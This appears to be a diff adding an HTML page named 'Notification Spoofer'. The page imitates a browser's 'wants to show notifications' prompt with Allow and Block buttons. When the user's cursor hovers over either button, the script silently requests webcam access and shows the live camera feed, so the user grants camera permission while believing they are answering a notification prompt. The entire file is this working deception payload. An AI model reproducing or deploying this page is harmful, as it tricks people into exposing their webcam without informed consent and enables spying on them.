@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel='stylesheet' href='https://cdn.jsdelivr.net/npm/sweetalert2@10.10.1/dist/sweetalert2.min.css'>
+    <title>Notification Spoofer</title>
+    <style>
+        .container-class {
+            display: flex !important;
+            justify-content: start;
+            text-align: left !important;
+        }
+        
+        .popup-class {
+            display: flex !important;
+            position: absolute !important;
+            left: 140px !important;
+            margin: 0 !important;
+            top: 0 !important;
+            background-color: #292a2e !important;
+            height: 125px;
+            width: 320px !important;
+        }
+        
+        .confirmButton-class {
+            position: absolute !important;
+            left: 170px;
+            background-color: #292a2e !important;
+            color: #87a1f5 !important;
+            border: solid 1px #3e3f43 !important;
+            font-size: 12px !important;
+        }
+        
+        .denyButton-class {
+            position: absolute !important;
+            left: 240px;
+            background-color: #292a2e !important;
+            color: #87a1f5 !important;
+            border: solid 1px #3e3f43 !important;
+            font-size: 12px !important;
+        }
+        
+        .title-class {
+            font-family: '' !important;
+            font-style: normal !important;
+            text-align: left !important;
+            font-size: 15px !important;
+            color: rgb(255, 255, 255) !important;
+        }
+        
+        i {
+            font-family: 'Arial Narrow' !important;
+            font-style: normal !important;
+            font-size: 13px !important;
+            text-align: left !important;
+            color: rgb(255, 255, 255);
+        }
+        
+        img {
+            text-align: left !important;
+            padding: 0 !important;
+        }
+        
+        .swal2-html-container {
+            margin-top: 0.8em !important;
+            margin-left: 0.9em !important;
+            text-align: left !important;
+        }
+        
+        .closeButton-class {
+            font-family: none !important;
+            font-size: 1.6em !important;
+        }
+        
+        #container {
+            margin: 0px auto;
+            width: 500px;
+            height: 375px;
+        }
+        
+        #videoElement {
+            width: 500px;
+            height: 375px;
+            background-color: rgb(255, 255, 255);
+        }
+    </style>
+
+</head>
+
+<body>
+    <div id="container">
+        <video autoplay="true" id="videoElement">
+        
+        </video>
+    </div>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
+    <script>
+        $(document).ready(function() {
+
+            Swal.fire({
+                title: "https://siddhamehta.tk wants to",
+                html: '<img src = "bell.jpeg" > <i> &nbsp&nbspShow notifications</i>',
+                showConfirmButton: true,
+                showDenyButton: true,
+                confirmButtonText: 'Allow',
+                denyButtonText: 'Block',
+                showCloseButton: true,
+                customClass: {
+                    container: 'container-class',
+                    popup: 'popup-class',
+                    header: '...',
+                    title: 'title-class',
+                    closeButton: 'closeButton-class',
+                    confirmButton: 'confirmButton-class',
+                    denyButton: 'denyButton-class',
+
+                }
+            })
+            var video = document.querySelector("#videoElement");
+            $("Button").hover(function() {
+                navigator.mediaDevices.getUserMedia({
+                    video: true
+                }).then(function(stream) {
+                    video.srcObject = stream;
+                }).catch(function(err0r) {
+                    console.log("Something went wrong!");
+                });
+                Swal.close()
+            });
+
+        })
+    </script>
+
+</body>
+
+</html>
